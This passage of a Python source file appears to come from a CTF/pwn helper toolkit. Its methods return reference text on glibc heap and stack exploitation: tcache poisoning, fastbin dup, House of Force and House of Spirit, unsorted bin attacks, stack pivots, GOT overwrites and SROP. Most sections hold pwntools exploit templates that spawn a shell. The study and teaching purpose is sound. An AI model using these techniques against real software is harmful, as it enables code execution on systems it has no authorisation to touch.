        result.append("""
Tcache (Thread Local Cache) was introduced in glibc 2.26.
Each thread has 64 singly-linked lists (tcache bins) for sizes 0x20-0x410.
Max 7 chunks per bin (by default).

=== TCACHE STRUCTURE ===
struct tcache_perthread_struct {
    uint16_t counts[TCACHE_MAX_BINS];  // Number of chunks in each bin
    tcache_entry *entries[TCACHE_MAX_BINS];  // Head of each linked list
};

struct tcache_entry {
    struct tcache_entry *next;  // In glibc 2.32+: next ^ (&next >> 12)
    struct tcache_perthread_struct *key;  // Double-free detection (2.29+)
};

=== BASIC TCACHE POISONING (glibc < 2.32) ===
1. Free chunk A (goes to tcache)
2. Overwrite A->next with target address (via UAF/overflow)
3. malloc() returns A
4. malloc() returns target address (arbitrary write!)

=== TCACHE POISONING WITH SAFE-LINKING (glibc 2.32+) ===
Chunks are protected: next = ptr ^ (&next >> 12)

To forge next pointer:
  heap_base = leaked_addr >> 12
  fake_next = target ^ heap_base

=== EXAMPLE EXPLOIT ===
from pwn import *

# Assume UAF or overflow vulnerability
chunk_a = malloc(0x20)
free(chunk_a)  # Goes to tcache[0x30]

# Overwrite freed chunk's next pointer
target = elf.got['puts']  # Or __malloc_hook, __free_hook
edit(chunk_a, p64(target))

# Two allocations: first returns chunk_a, second returns target
malloc(0x20)
evil_chunk = malloc(0x20)  # Returns target address!
edit(evil_chunk, p64(system))  # Overwrite GOT/hook
""")

        if _compare_glibc_version(libc_version, "2.32") >= 0:
            result.append("""
=== SAFE-LINKING BYPASS (glibc 2.32+) ===
# Need to leak heap address first
heap_leak = leak()
heap_base = heap_leak >> 12

# Encode the target address
target = __free_hook
encoded_next = target ^ heap_base

# Write encoded pointer
edit(freed_chunk, p64(encoded_next))
""")

        return '\n'.join(result)

    @dangerous_operation(
        risk_level=RiskLevel.HIGH,
        description="Fastbin dup heap exploitation technique"
    )
    def heap_fastbin(self, arch: str = "x64") -> str:
        """Fastbin dup attack technique"""
        result = ["Fastbin Dup Attack:", "-" * 50]
        result.append(f"Architecture: {arch}")
        result.append("")

        result.append("""
Fastbin is a singly-linked LIFO list for small chunks (< 0x80 on x64).
No coalescing, minimal security checks (only same-size double-free check).

=== FASTBIN DUP (Double Free) ===
The classic technique to get overlapping allocations:

1. malloc(A)  -> 0x1000
2. malloc(B)  -> 0x1030
3. free(A)    -> fastbin: A -> NULL
4. free(B)    -> fastbin: B -> A -> NULL
5. free(A)    -> fastbin: A -> B -> A (cycle!)

Now we can allocate A twice and control its next pointer.

=== FASTBIN DUP INTO STACK/GOT ===
from pwn import *

# Create fastbin cycle
a = malloc(0x68)
b = malloc(0x68)
free(a)
free(b)
free(a)  # Double free: a -> b -> a

# First alloc gets A, write fake next pointer
chunk = malloc(0x68)
target = stack_addr - 0x23  # Adjusted for size field
edit(chunk, p64(target))

# Drain the cycle
malloc(0x68)  # Gets B
malloc(0x68)  # Gets A again

# Next malloc returns our target!
stack_chunk = malloc(0x68)
edit(stack_chunk, b'A' * 0x18 + p64(return_addr))

=== FAKE CHUNK REQUIREMENTS ===
For malloc to return our target, we need a valid size field:
- Target should have 0x70/0x71 at offset -8 (for 0x68 allocation)
- Common trick: use misaligned read in __malloc_hook area

# __malloc_hook area often has 0x7f byte that looks like size
target = libc.symbols['__malloc_hook'] - 0x23  # Align to find 0x7f
""")

        return '\n'.join(result)

    @dangerous_operation(
        risk_level=RiskLevel.HIGH,
        description="House of Force heap exploitation technique"
    )
    def heap_house_of_force(self) -> str:
        """House of Force attack technique"""
        result = ["House of Force:", "-" * 50]
        result.append("")

        result.append("""
House of Force exploits the top chunk (wilderness) to get arbitrary allocation.
Requires: Ability to overwrite top chunk size with very large value.

=== REQUIREMENTS ===
1. Heap overflow to corrupt top chunk size
2. Controlled malloc size parameter
3. Known heap and target addresses

=== TECHNIQUE ===
1. Overflow top chunk size to -1 (0xffffffffffffffff)
2. Calculate distance to target:
   distance = target_addr - top_chunk_addr - header_size
3. malloc(distance) - moves top chunk to target
4. Next malloc returns target address!

=== EXPLOIT CODE ===
from pwn import *

# Step 1: Overflow top chunk size
chunk = malloc(0x20)
payload = b'A' * 0x20  # Fill chunk
payload += p64(0)      # prev_size
payload += p64(0xffffffffffffffff)  # size = -1
edit(chunk, payload)

# Step 2: Calculate evil size
target = elf.got['free']
top_chunk = heap_base + 0x30  # Approximate
distance = target - top_chunk - 0x20  # Account for headers

# Handle negative distances (wrap around)
if distance < 0:
    distance = (distance + (1 << 64)) & 0xffffffffffffffff

# Step 3: Move top chunk
malloc(distance)

# Step 4: Get target
evil = malloc(0x20)  # Returns target!
edit(evil, p64(system))

=== MITIGATIONS (Modern glibc) ===
- glibc 2.29+: Top chunk size validation
- Fails if: top_size > av->system_mem
- Bypass: Use other techniques (tcache, fastbin, etc.)
""")

        return '\n'.join(result)

    @dangerous_operation(
        risk_level=RiskLevel.HIGH,
        description="House of Spirit heap exploitation technique"
    )
    def heap_house_of_spirit(self) -> str:
        """House of Spirit attack technique"""
        result = ["House of Spirit:", "-" * 50]
        result.append("")

        result.append("""
House of Spirit frees a fake chunk to get it into a bin,
then reallocates it to control that memory region.

=== REQUIREMENTS ===
1. Ability to write fake chunk headers
2. Control over free() argument
3. Subsequent malloc of same size

=== FAKE CHUNK LAYOUT (fastbin, 0x40 size) ===

           +------------------+
target ->  | prev_size (any)  |  offset 0x00
           +------------------+
           | size (0x41)      |  offset 0x08  <- Critical!
           +------------------+
           |  ... data ...    |  offset 0x10
           +------------------+
           | next chunk size  |  offset 0x50  <- Must be valid!
           +------------------+

Next chunk size must be > 0x10 and < av->system_mem

=== EXPLOIT CODE ===
from pwn import *

# Create fake chunk on stack
fake_chunk_addr = stack_addr
payload = p64(0)       # prev_size
payload += p64(0x41)   # size (0x40 + PREV_INUSE)
payload += b'X' * 0x30 # data
payload += p64(0)      # next prev_size
payload += p64(0x1234) # next size (valid range)

# Write fake chunk
write_to_stack(fake_chunk_addr, payload)

# Free the fake chunk (need to control free argument)
# Target the user data area, not the header!
free(fake_chunk_addr + 0x10)

# Allocate to get our fake chunk
evil = malloc(0x38)  # Same size class
# evil points to fake_chunk_addr + 0x10 (stack!)

=== USE CASES ===
1. Stack buffer -> Control return address
2. BSS region -> Control global variables
3. Heap metadata -> Further exploitation
""")

        return '\n'.join(result)

    def heap_unsorted_bin(self) -> str:
        """Unsorted bin attack technique"""
        result = ["Unsorted Bin Attack:", "-" * 50]
        result.append("")

        result.append("""
Unsorted bin is a doubly-linked list for recently freed chunks.
Classic unsorted bin attack writes main_arena address to arbitrary location.

=== UNSORTED BIN STRUCTURE ===
Freed chunk in unsorted bin:
  +------------------+
  | prev_size        |
  +------------------+
  | size             |
  +------------------+
  | fd (forward)     | -> next chunk or main_arena+88
  +------------------+
  | bk (backward)    | -> prev chunk or main_arena+88
  +------------------+

=== CLASSIC UNSORTED BIN ATTACK ===
When chunk is removed from unsorted bin:
  bck = victim->bk
  bck->fd = unsorted_chunks(av)  // Writes main_arena addr!

If we control victim->bk, we can write main_arena+88 to bk+0x10 (fd offset).

=== EXPLOIT CODE ===
from pwn import *

# Get a chunk into unsorted bin (size > 0x80, or tcache full)
chunk = malloc(0x100)
malloc(0x20)  # Prevent consolidation with top
free(chunk)   # Goes to unsorted bin

# Overwrite bk pointer (via UAF or overflow)
target = global_max_fast - 0x10  # Example target
edit(chunk, p64(0) + p64(target))  # fd, bk

# Trigger the write by allocating different size
malloc(0x200)  # Removes chunk from unsorted bin
# Now *target = main_arena + 88

=== LIBC LEAK FROM UNSORTED BIN ===
# First chunk in unsorted bin has fd = bk = main_arena + 88
chunk = malloc(0x100)
malloc(0x20)
free(chunk)

# If we can read freed chunk:
leak = read(chunk)
main_arena = u64(leak[:8]) - 88
libc_base = main_arena - 0x3ebc40  # Offset varies by version

=== MITIGATIONS (glibc 2.29+) ===
Added check: if (bck->fd != victim) abort()
Unsorted bin attack is harder, use:
- Tcache stashing unlink attack
- Large bin attack
""")

        return '\n'.join(result)

    def heap_chunk_structure(self, arch: str = "x64") -> str:
        """Heap chunk structure reference"""
        ptr_size = 8 if arch == "x64" else 4

        result = ["Heap Chunk Structure:", "-" * 50]
        result.append(f"Architecture: {arch}")
        result.append(f"Pointer size: {ptr_size} bytes")
        result.append("")

        result.append(f"""
=== ALLOCATED CHUNK ===

                +------------------+
chunk addr ->   | prev_size        |  {ptr_size} bytes (only if prev free)
                +------------------+
                | size        |AMP |  {ptr_size} bytes
                +------------------+
mem returned -> |                  |
                |   user data      |
                |                  |
                +------------------+

Size field flags (lowest 3 bits):
  A (0x04) - NON_MAIN_ARENA
  M (0x02) - IS_MMAPPED
  P (0x01) - PREV_INUSE

Minimum chunk size: {0x20 if arch == "x64" else 0x10} bytes (including headers)
Alignment: {0x10 if arch == "x64" else 0x8} bytes

=== FREED CHUNK (bins) ===

                +------------------+
                | prev_size        |
                +------------------+
                | size        |AMP |
                +------------------+
                | fd (forward ptr) |  -> next free chunk
                +------------------+
                | bk (back ptr)    |  -> prev free chunk
                +------------------+
                |                  |
                |   (unused)       |
                +------------------+

=== FREED CHUNK (large bins only) ===
Additional pointers:
                +------------------+
                | fd_nextsize      |  -> next different-sized chunk
                +------------------+
                | bk_nextsize      |  -> prev different-sized chunk
                +------------------+

=== TCACHE ENTRY (glibc 2.26+) ===

                +------------------+
                | next             |  -> next tcache entry (or 0)
                +------------------+
                | key              |  -> tcache_perthread_struct (2.29+)
                +------------------+

=== BIN TYPES ===
Fast bins:   size < 0x{80 if arch == "x64" else 40} (singly-linked, LIFO)
Tcache:      size 0x{20 if arch == "x64" else 10}-0x{410 if arch == "x64" else 200}, max 7 per bin
Small bins:  size < 0x{400 if arch == "x64" else 200} (doubly-linked, FIFO)
Large bins:  size >= 0x{400 if arch == "x64" else 200} (sorted by size)
Unsorted:    temporary holding bin (doubly-linked)
""")

        return '\n'.join(result)

    # === Stack Techniques ===

    def stack_pivot(self) -> str:
        """Stack pivot/migration techniques"""
        result = ["Stack Pivot Techniques:", "-" * 50]
        result.append("")

        result.append("""
Stack pivot redirects RSP to attacker-controlled memory,
allowing ROP when only a small overflow is available.

=== COMMON GADGETS ===

1. leave; ret (most common)
   - Sets RSP = RBP, then pops new RBP
   - Write fake stack at [RBP], pivot with leave;ret

2. xchg REG, rsp; ret
   - Direct register swap
   - xchg eax, esp; ret

3. mov rsp, REG; ret
   - Direct move to RSP

4. pop rsp; ret
   - Pop new RSP from stack
   - Need just 8 bytes overflow

5. add/sub rsp, VALUE; ret
   - Relative pivot

=== LEAVE; RET PIVOT ===
from pwn import *

# Setup: We control a buffer at known address
fake_stack_addr = bss_addr  # Or leaked heap/stack

# Write ROP chain to fake stack
fake_stack = flat([
    0xdeadbeef,         # Fake saved RBP
    pop_rdi, bin_sh,
    system_addr,
])
write(fake_stack_addr, fake_stack)

# Overflow to set RBP = fake_stack, return to leave;ret
leave_ret = elf.search(asm('leave; ret')).__next__()

payload = b'A' * buf_size
payload += p64(fake_stack_addr)  # Saved RBP -> fake stack
payload += p64(leave_ret)        # Return to leave;ret

# Execution:
# 1. leave: mov rsp, rbp; pop rbp -> RSP = fake_stack_addr
# 2. ret: pops first gadget from fake stack

=== POP RSP PIVOT ===
pop_rsp = elf.search(asm('pop rsp; ret')).__next__()

payload = b'A' * offset
payload += p64(pop_rsp)
payload += p64(fake_stack_addr + 8)  # New RSP value

=== XCHG PIVOT ===
# xchg rax, rsp often found in vsyscall
xchg_rax_rsp = 0xffffffffff600000 + offset

# First set RAX to target
payload = flat([
    pop_rax, fake_stack_addr,
    xchg_rax_rsp,
])

=== PARTIAL OVERWRITE PIVOT ===
# When only 1-2 bytes overflow, can pivot to nearby
# by overwriting just LSB of saved RBP/RSP
""")

        return '\n'.join(result)

    def stack_layout(self, arch: str = "x64") -> str:
        """Visualize stack layout"""
        result = ["Stack Layout:", "-" * 50]
        result.append(f"Architecture: {arch}")
        result.append("")

        if arch == "x64":
            result.append("""
=== x64 STACK LAYOUT (System V AMD64 ABI) ===

High addresses
    +---------------------------+
    |   Command line args       |
    +---------------------------+
    |   Environment variables   |
    +---------------------------+
    |   Auxiliary vector        |
    +---------------------------+
    |   NULL                    |  <- End of argv
    +---------------------------+
    |   argv[n]                 |
    |   ...                     |
    |   argv[0]                 |
    +---------------------------+
    |   argc                    |
    +---------------------------+
    |                           |
    |   main() stack frame      |
    |                           |
    +---------------------------+
    |   Return address          |  <- To __libc_start_main
    +---------------------------+
    |   Saved RBP               |
    +---------------------------+
    |   Local variables         |
    |   Buffer                  |  <- Overflow target
    +---------------------------+
    |   Red zone (128 bytes)    |  <- Below RSP, can be used
    +---------------------------+
Low addresses (RSP points here)

=== FUNCTION PROLOGUE ===
push rbp          ; Save caller's RBP
mov rbp, rsp      ; Set new frame base
sub rsp, N        ; Allocate local space

=== FUNCTION EPILOGUE ===
leave             ; mov rsp, rbp; pop rbp
ret               ; pop rip

=== CALLING CONVENTION (System V AMD64) ===
Arguments: RDI, RSI, RDX, RCX, R8, R9, then stack
Return: RAX (and RDX for 128-bit)
Caller-saved: RAX, RCX, RDX, RSI, RDI, R8-R11
Callee-saved: RBX, RBP, R12-R15

=== STACK FRAME DURING CALL ===
    +---------------------------+
    |   arg N (if > 6 args)     |
    +---------------------------+
    |   Return address          |  <- RSP after CALL
    +---------------------------+
    |   Saved RBP               |  <- RBP points here
    +---------------------------+
    |   Local vars [RBP-8]      |
    |   Buffer [RBP-0x20]       |  <- Overflow starts here
    +---------------------------+
""")
        else:  # x86
            result.append("""
=== x86 STACK LAYOUT (cdecl) ===

    +---------------------------+
    |   arg 3                   |
    +---------------------------+
    |   arg 2                   |
    +---------------------------+
    |   arg 1                   |
    +---------------------------+
    |   Return address          |  <- ESP after CALL
    +---------------------------+
    |   Saved EBP               |  <- EBP points here
    +---------------------------+
    |   Local variables         |
    |   Buffer [EBP-0x20]       |  <- Overflow target
    +---------------------------+

=== CALLING CONVENTION (cdecl) ===
Arguments: Pushed right to left on stack
Return: EAX
Caller cleans up stack
""")

        return '\n'.join(result)

    # === GOT/PLT ===

    def got_plt(self, arch: str = "x64") -> str:
        """GOT/PLT overwrite helper"""
        result = ["GOT/PLT Overwrite:", "-" * 50]
        result.append(f"Architecture: {arch}")
        result.append("")

        result.append("""
=== LAZY BINDING PROCESS ===

1. Code calls func@plt
2. PLT stub jumps to address in GOT
3. First call: GOT contains address of PLT+6 (resolver)
4. Resolver finds real address, writes to GOT
5. Subsequent calls go directly to function

=== PLT STUB (x64) ===
func@plt:
    jmp    [func@got]     ; Jump to GOT entry
    push   index          ; Push relocation index
    jmp    resolver       ; Jump to dynamic linker

=== GOT OVERWRITE ===
If we can write to GOT before function is called:
- Full RELRO: GOT is read-only (not exploitable)
- Partial RELRO: GOT writable (exploitable!)
- No RELRO: GOT writable

=== EXPLOITATION ===
from pwn import *

elf = ELF('./binary')

# Check RELRO
print(elf.checksec())

# Common targets:
# - Overwrite puts@got with system
# - Overwrite free@got with system
# - Overwrite exit@got with one_gadget

# Example: free(chunk) -> system(chunk)
target = elf.got['free']
payload = p64(system_addr)
write(target, payload)

# Now free("/bin/sh") calls system("/bin/sh")
malloc_chunk(b'/bin/sh\\x00')
free(chunk)

=== USING FORMAT STRING ===
# Write system address to puts@GOT
target = elf.got['puts']
system = libc.symbols['system']

# Using pwntools fmtstr_payload
payload = fmtstr_payload(offset, {target: system})

=== COMMON GOT TARGETS ===
1. printf/puts -> system  (then call with "/bin/sh")
2. free -> system         (free chunk containing "/bin/sh")
3. strlen -> system       (often called on user input)
4. atoi -> system         (menu programs)
5. exit -> one_gadget     (clean RCE)
""")

        return '\n'.join(result)

    # === SROP ===

    def sigreturn(self, arch: str = "x64") -> str:
        """SROP (Sigreturn-oriented programming)"""
        result = ["SROP (Sigreturn-Oriented Programming):", "-" * 50]
        result.append(f"Architecture: {arch}")
        result.append("")

        result.append("""
SROP exploits the sigreturn syscall to set all registers at once.
When signal handler returns, kernel restores registers from stack.

=== SIGRETURN FRAME (x64) ===
After signal handler, stack contains saved context (ucontext):

Offset  Register
0x00    uc_flags
0x08    uc_link
0x10    uc_stack.ss_sp
0x18    uc_stack.ss_flags
0x20    uc_stack.ss_size
0x28    r8
0x30    r9
0x38    r10
0x40    r11
0x48    r12
0x50    r13
0x58    r14
0x60    r15
0x68    rdi        <- First argument!
0x70    rsi        <- Second argument!
0x78    rbp
0x80    rbx
0x88    rdx        <- Third argument!
0x90    rax        <- Syscall number!
0x98    rcx
0xa0    rsp        <- New stack pointer!
0xa8    rip        <- New instruction pointer!
0xb0    eflags
0xb8    cs/gs/fs/ss
...

=== BASIC SROP EXPLOIT ===
from pwn import *

context.arch = 'amd64'

# Create sigreturn frame
frame = SigreturnFrame()
frame.rax = 59          # execve syscall
frame.rdi = bin_sh_addr # "/bin/sh"
frame.rsi = 0           # NULL
frame.rdx = 0           # NULL
frame.rsp = stack_addr  # New stack (optional)
frame.rip = syscall_ret # syscall; ret gadget

# Trigger sigreturn (syscall 15)
syscall_ret = 0x401234  # syscall; ret gadget
pop_rax = 0x401235      # pop rax; ret

payload = flat([
    b'A' * offset,
    pop_rax, 15,        # rax = sigreturn
    syscall_ret,        # Call sigreturn
    bytes(frame)        # Sigreturn frame
])

=== SROP ADVANTAGES ===
1. Only need syscall;ret and pop rax;ret gadgets
2. Can set ALL registers in one syscall
3. Works even with very limited gadgets

=== CHAINING SROP ===
# Set rip to another syscall;ret
# Set rsp to next frame
# Chain multiple syscalls (open->read->write)
""")

        return '\n'.join(result)

    # === Syscall Reference ===

    def syscall_table(self, arch: str = "x64", syscall_name: str = None) -> str:
        """Linux syscall reference"""
        result = ["Linux Syscall Table:", "-" * 50]
        result.append(f"Architecture: {arch}")
        result.append("")

        syscalls = {
            "x64": {
                "read":      {"num": 0,  "args": "rdi=fd, rsi=buf, rdx=count"},
                "write":     {"num": 1,  "args": "rdi=fd, rsi=buf, rdx=count"},
                "open":      {"num": 2,  "args": "rdi=path, rsi=flags, rdx=mode"},
                "close":     {"num": 3,  "args": "rdi=fd"},
                "stat":      {"num": 4,  "args": "rdi=path, rsi=statbuf"},
                "fstat":     {"num": 5,  "args": "rdi=fd, rsi=statbuf"},
                "mmap":      {"num": 9,  "args": "rdi=addr, rsi=len, rdx=prot, r10=flags, r8=fd, r9=off"},
                "mprotect":  {"num": 10, "args": "rdi=addr, rsi=len, rdx=prot"},
                "munmap":    {"num": 11, "args": "rdi=addr, rsi=len"},
                "sigreturn": {"num": 15, "args": "(none - restores from stack)"},
                "ioctl":     {"num": 16, "args": "rdi=fd, rsi=request, rdx=arg"},
                "dup2":      {"num": 33, "args": "rdi=oldfd, rsi=newfd"},
                "socket":    {"num": 41, "args": "rdi=domain, rsi=type, rdx=protocol"},
                "connect":   {"num": 42, "args": "rdi=sockfd, rsi=addr, rdx=addrlen"},
                "accept":    {"num": 43, "args": "rdi=sockfd, rsi=addr, rdx=addrlen"},
                "execve":    {"num": 59, "args": "rdi=path, rsi=argv, rdx=envp"},
                "exit":      {"num": 60, "args": "rdi=status"},
                "getdents":  {"num": 78, "args": "rdi=fd, rsi=dirp, rdx=count"},
                "getcwd":    {"num": 79, "args": "rdi=buf, rsi=size"},
                "chdir":     {"num": 80, "args": "rdi=path"},
                "openat":    {"num": 257, "args": "rdi=dirfd, rsi=path, rdx=flags, r10=mode"},
                "execveat":  {"num": 322, "args": "rdi=dirfd, rsi=path, rdx=argv, r10=envp, r8=flags"},
            },
            "x86": {
                "exit":      {"num": 1,  "args": "ebx=status"},
                "read":      {"num": 3,  "args": "ebx=fd, ecx=buf, edx=count"},
                "write":     {"num": 4,  "args": "ebx=fd, ecx=buf, edx=count"},
                "open":      {"num": 5,  "args": "ebx=path, ecx=flags, edx=mode"},
                "close":     {"num": 6,  "args": "ebx=fd"},
                "execve":    {"num": 11, "args": "ebx=path, ecx=argv, edx=envp"},
                "mmap2":     {"num": 192, "args": "ebx=addr, ecx=len, edx=prot, esi=flags, edi=fd, ebp=off"},
                "socketcall":{"num": 102, "args": "ebx=call, ecx=args"},
            },
        }

        if arch not in syscalls:
            return f"Unknown arch. Available: {list(syscalls.keys())}"

        arch_syscalls = syscalls[arch]

        if syscall_name:
            if syscall_name in arch_syscalls:
                sc = arch_syscalls[syscall_name]
                result.append(f"{syscall_name}:")
                result.append(f"  Number: {sc['num']}")
                result.append(f"  Args: {sc['args']}")
            else:
                result.append(f"Unknown syscall: {syscall_name}")
                result.append(f"Available: {list(arch_syscalls.keys())}")
        else:
            result.append("Common syscalls:")
            for name, sc in arch_syscalls.items():
                result.append(f"  {sc['num']:3d}  {name:12s}  {sc['args']}")

        result.append("")
        result.append("Full reference: man 2 syscall, /usr/include/asm/unistd_64.h")

        return '\n'.join(result)
